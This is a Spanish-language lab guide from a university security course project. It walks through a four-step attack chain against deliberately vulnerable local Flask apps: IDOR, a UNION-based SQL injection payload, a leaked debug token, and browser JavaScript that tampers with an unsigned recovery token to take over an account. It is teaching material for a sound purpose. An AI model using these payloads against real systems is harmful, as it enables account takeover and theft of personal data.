FORT KNOX — Como probar la cadena de ataque
UTN FRBA - K5061 - Grupo 4 - 2026
============================================

REQUISITOS
----------
- Tener Python 3.10+ instalado
- Abrir DOS terminales

LEVANTAR LAS APPS
-----------------

Terminal 1 — Portal de Clientes (puerto 5000):
  cd clientes
  python -m pip install flask   (solo la primera vez)
  python seed.py                (solo la primera vez)
  python app.py

Terminal 2 — Portal de Seguimiento (puerto 5001):
  cd tracking
  python -m pip install flask   (solo la primera vez)
  python seed.py                (solo la primera vez)
  python app.py

O con Docker (una sola terminal):
  docker compose up --build


PASO A PASO EN EL BROWSER
--------------------------

PASO 0 — Verificar que sin cookie no se puede entrar al tracking
  Abrir ventana de incognito y navegar a:
    http://localhost:5001
  Resultado esperado: redirige al login con "cookie de sesion no encontrada"


PASO 1 — Login como atacante (crea la cookie SSO)
  Navegar a:
    http://localhost:5000/login
  Ingresar:
    Usuario:    attacker
    Contrasena: FK2026!
  Resultado esperado: dashboard con el pedido de Juan Atacante (Cadena de Plata)

  Por que importa: al loguearse en el portal de clientes se crea la cookie fk_session,
  que tambien es valida en el portal de seguimiento porque ambos comparten el mismo
  secret_key.


PASO 2 — IDOR: ver el envio de la victima  [Vulnerabilidad A01]
  Navegar al propio envio:
    http://localhost:5001/tracking?shipment_id=666
  Ver que muestra el envio del atacante.

  Cambiar el ID en la URL al de la victima (fuerza bruta: barrido desde 666 hacia arriba):
    http://localhost:5001/tracking?shipment_id=692
  Resultado esperado: datos de Carlos Gomez (nombre, ID de cliente, orden) sin ser el dueno del envio.

  Dato obtenido: ID de cliente = 204815  (el detalle no muestra el email)

  Por que funciona: el servidor valida que haya sesion activa pero no verifica
  que el shipment_id pertenezca al usuario autenticado.


PASO 3 — SQL Injection: extraer el email  [Vulnerabilidad A05]
  El buscador de envios por email (pagina principal) es vulnerable. El atacante todavia
  NO tiene el email: solo el ID de cliente del Paso 2. Lo inyecta para extraerlo.

  Navegar a:
    http://localhost:5001/
  Ingresar en el campo de busqueda:
    ' UNION SELECT email,'-','-','-','-' FROM users WHERE id=204815--
  Resultado esperado: aparece una fila donde la columna "Nro. de envio" muestra
  carlos.gomez@gmail.com (datos en columnas que no corresponden = UI rota por la inyeccion).

  Dato obtenido: email = carlos.gomez@gmail.com

  Por que funciona: el backend concatena el parametro email directamente en la query SQL
  sin usar consultas parametrizadas, permitiendo inyectar un UNION SELECT.


PASO 4 — Security Misconfiguration: obtener el token de recuperacion  [Vulnerabilidad A02]
  Navegar a:
    http://localhost:5000/account/recover
  Ingresar:
    Email: carlos.gomez@gmail.com
  La pagina solo dice "Te enviamos las instrucciones a carlos.gomez@gmail.com".

  Abrir DevTools (F12) -> Network -> hacer clic en la request POST a /account/recover
  -> pestaña Headers -> Response Headers.
  Resultado esperado: aparece el header:
    X-Debug-Token: eyJ...

  Copiar el valor de ese header.

  Por que funciona: el desarrollador dejo el token en un response header de debug.
  En produccion ese token solo deberia enviarse por email al dueno de la cuenta.


PASO 5 — Token Tampering: tomar el control de la cuenta  [Vulnerabilidad A08]
  Abrir la consola del browser (F12) y pegar el siguiente codigo
  reemplazando TOKEN_AQUI con el token copiado en el paso anterior:

  ---
  const token = "TOKEN_AQUI";
  const padded = token + "=".repeat((4 - token.length % 4) % 4);
  const payload = JSON.parse(atob(padded.replace(/-/g, '+').replace(/_/g, '/')));
  console.log("Original:", JSON.stringify(payload));
  payload.authorized_email = "attacker@mailinator.com";
  const tampered = btoa(JSON.stringify(payload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  console.log("Tampered:", tampered);
  window.location = "http://localhost:5000/account/confirm-recovery?token=" + tampered;
  ---

  Resultado esperado: pantalla "Acceso concedido" con sesion iniciada como carlos_gomez
  y email actualizado a attacker@mailinator.com.

  Por que funciona: el token es JSON codificado en base64url sin ninguna firma ni HMAC.
  El servidor decodifica el token y acepta su contenido sin verificar integridad,
  por lo que cualquier modificacion al payload es aceptada como valida.


RESULTADO FINAL
---------------
El atacante tiene acceso total a la cuenta de carlos_gomez.
La cadena completa uso 4 vulnerabilidades encadenadas:
  A01 (IDOR)     -> ID de cliente de la victima
  A05 (SQLi)     -> email de la victima
  A02 (Misconfig)-> token de recuperacion en la respuesta
  A08 (Tampering)-> acceso a la cuenta sin conocer la contrasena
